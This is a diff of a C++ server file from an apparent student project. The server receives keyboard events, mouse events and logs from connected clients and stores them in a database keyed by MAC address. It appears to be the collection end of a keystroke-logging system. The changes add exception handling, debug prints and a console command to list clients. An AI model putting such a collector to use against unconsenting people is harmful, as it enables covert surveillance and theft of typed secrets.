@@ -5,7 +5,7 @@
 // Login   <antoine.plaskowski@epitech.eu>
 // 
 // Started on  Sat Oct 24 17:20:22 2015 Antoine Plaskowski
-// Last update Fri Nov  6 18:52:18 2015 Antoine Plaskowski
+// Last update Sun Nov  8 18:38:31 2015 Antoine Plaskowski
 //
 
 #include	"Server.hpp"
@@ -46,8 +46,15 @@ Server::~Server(void)
 bool	Server::run(void)
 {
   select();
-  if (m_server.can_read() == true)
-    m_clients.push_back(&m_new_iprotocol(m_server.accept(), m_new_itime()));
+  try
+    {
+      if (m_server.can_read() == true)
+	m_clients.push_back(&m_new_iprotocol(m_server.accept(), m_new_itime()));
+    }
+  catch (std::exception &e)
+    {
+      std::cerr << e.what() << std::endl;
+    }
   if (m_in.can_read() == true && command() == true)
     return (true);
   for (auto it = m_clients.begin(); it != m_clients.end(); it++)
@@ -58,18 +65,22 @@ bool	Server::run(void)
 	    throw std::exception();
 	  else
 	    {
-	      auto keyboard = (*it)->get_keyboard();
+	      std::cout << "database time 1" << std::endl;
+	      auto &keyboard = (*it)->get_keyboard();
 	      for (auto key = keyboard.begin(); key != keyboard.end(); key++)
 		m_database.insert_keyboard((*it)->get_mac_address(), **key);
 	      keyboard.clear();
-	      auto mouse = (*it)->get_mouse();
+	      std::cout << "database time 2" << std::endl;
+	      auto &mouse = (*it)->get_mouse();
 	      for (auto key = mouse.begin(); key != mouse.end(); key++)
 		m_database.insert_mouse((*it)->get_mac_address(), **key);
 	      mouse.clear();
-	      auto log = (*it)->get_log();
+	      std::cout << "database time 3" << std::endl;
+	      auto &log = (*it)->get_log();
 	      for (auto key = log.begin(); key != log.end(); key++)
 		m_database.insert_log((*it)->get_mac_address(), **key);
 	      log.clear();
+	      std::cout << "database time 4" << std::endl;
 	    }
 	}
       catch (std::exception &e)
@@ -92,9 +103,12 @@ bool	Server::command(void)
     return (true);
   std::string	input(reinterpret_cast<char *>(buf), ret);
 
-  if (input == "show\n")
+  if (input == "client\n")
     for (auto it = m_clients.begin(); it != m_clients.end(); it++)
       std::cout << (*it)->get_mac_address() << std::endl;
+  else if (input == "show\n")
+    for (auto it = m_clients.begin(); it != m_clients.end(); it++)
+      m_database.show((*it)->get_mac_address());
   return (false);
 }
 
